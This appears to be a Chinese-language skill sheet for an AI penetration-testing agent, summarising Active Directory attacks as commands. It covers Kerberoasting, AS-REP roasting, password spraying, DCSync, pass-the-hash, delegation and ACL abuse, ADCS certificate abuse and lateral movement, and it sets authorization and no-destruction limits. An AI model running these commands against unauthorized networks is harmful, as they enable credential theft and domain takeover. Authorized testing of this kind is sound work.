---
name: active-directory-attack
description: 目标存在 Windows 域环境、拿到域账号或内网 SMB/WinRM 可达时调用——域枚举、Kerberoast/AS-REP、委派、ADCS、ACL 滥用、DCSync、BloodHound 路径与 Exchange 攻击面。
tags:
  cwe: [CWE-522, CWE-269, CWE-287, CWE-284]
  attack: [T1558.003, T1558.004, T1003.006, T1484, T1550.002, T1134]
  class: [active-directory, kerberos, domain, windows, adcs]
---

# 域渗透速查

## 与本平台的衔接

| 场景 | 用平台能力 |
|---|---|
| 域内命令 | Bash（`nxc`/`impacket`/`certipy`/`bloodhound-python`，宿主环境页按需装） |
| 服务探活/指纹 | `http_probe`；端口 `nmap` 经 Bash |
| Web 面（Exchange/OWA） | `http_request` + `auth_request`（已登记凭据） |
| hash/票据记录 | 全文写 `record_fact`（来源主机、服务、到期时间） |
| 证据 | `save_evidence`（命令输出、权限路径）；`report_finding` |
| 已知漏洞 | `search_vulns`（Exchange/ADCS 组件版本） |

## 前置

- 一个域账号（哪怕低权）或一台已控主机；确认 DC 地址与 DNS（`nltest /dsgetdc:domain`）；
- 所有 hash/票据**全文落 fact**（含来源主机、服务、到期时间）。

## 一、枚举（低噪声优先）

- 无凭据：`nxc smb <dc>`（版本/域信息）、`nxc ldap <dc> -u '' -p ''`（匿名）；
- 有凭据：`nxc smb <dc> -u user -p pass --users --groups --shares`；
- 域信息：`net user /domain`、`net group "Domain Admins" /domain`、`Get-ADUser -Filter *`；
- BloodHound：`bloodhound-python -u user -p pass -d dom -ns dc -c All` → 最短路径到 DA；
- 共享：`nxc smb <host> -u user -p pass --shares`，重点 SYSVOL/NETLOGON 的 GPP。

## 二、凭据攻击

| 手法 | 命令 | 说明 |
|---|---|---|
| Kerberoast | `impacket-GetUserSPNs dom/user:pass -dc-ip dc -request` | SPN 账号 TGS → `hashcat -m 13100` |
| AS-REP | `impacket-GetNPUsers dom/ -usersfile users.txt -no-pass -format hashcat` | 无需预认证 → `hashcat -m 18200` |
| 密码喷洒 | `nxc smb <dc> -u users.txt -p 'Spring2026!' --continue-on-success` | 先查锁定策略，2-3 次 |
| GPP | `gpp-decrypt <cpassword>` | SYSVOL Groups.xml |
| DCSync | `impacket-secretsdump dom/admin:pass@dc` | 需复制目录权限 |
| PtH | `impacket-wmiexec -hashes :<ntlm> user@host` | 无明文横向 |

## 三、委派与 ACL

- 非约束委派：`impacket-findDelegation dom/user:pass -dc-ip dc`；
- 约束委派 → S4U：`impacket-getST -spn cifs/host -impersonate administrator`；
- RBCD：写 `msDS-AllowedToActOnBehalfOfOtherIdentity` 后走 S4U；
- ACL 滥用（BloodHound 常用边）：`GenericAll`/`WriteDACL`/`AddMember`/`ForceChangePassword`/
  `GenericWrite`（可改脚本路径）/`WriteOwner`；
- 验证：只读确认权限（`bloodyAD`/`impacket` 的 read），需要写时先用最小操作并在测试环境。

## 四、ADCS（证书服务）

- `certipy find -u user@dom -p pass -dc-ip dc -vulnerable`；
- ESC1：模板允许请求者指定 SAN + 客户端认证 → 申请管理员证书；
- ESC2/3：任意用途/可注册的模板；ESC4：模板 ACL 可写；ESC6：`EDITF_ATTRIBUTESUBJECTALTNAME2`；
- ESC8：HTTP relay → `certipy relay -target http://<adcs>/certsrv`；
- 拿到证书：`certipy auth -pfx admin.pfx` 换 TGT。

## 五、Exchange / 邮件

- `/autodiscover/autodiscover.xml`、`/owa/`、`/ecp/`、`/mapi/` 指纹；
- ProxyLogon/ProxyShell 类只做**版本+行为**双重验证，不直接打利用链；
- 邮箱枚举走 OWA/EWS 认证差异（注意锁定策略）。

## 六、横向与持久化（演示级）

- WinRM：`nxc winrm <host> -u user -p pass -x whoami`；
- SMB exec：`impacket-psexec/smbexec`；
- 哈希传递/票据传递：`-hashes` / `KRB5CCNAME`；
- 持久化只落 fact 说明可行（计划任务/服务注册），**不实际部署**。

## 七、证据与验证纪律

- 每条路径记录：起点主机/账号 → 手法 → 终点权限，形成可复核的链；
- 域控上**不做写操作**；DCSync 只导出必要账号 hash（最小集）；
- 触发锁定前停手（账号被锁会打草惊蛇），写 fact 供决策；
- 票据/hash 脱敏后进报告，原文只进 `record_fact`/证据附件。

## 八、边界

- 只测试授权域/主机；不横向到未证明归属的网段；
- 不做破坏性写操作（改 GPO/删对象/部署后门）；
- 生产域控只读；持久化仅做可行性说明。
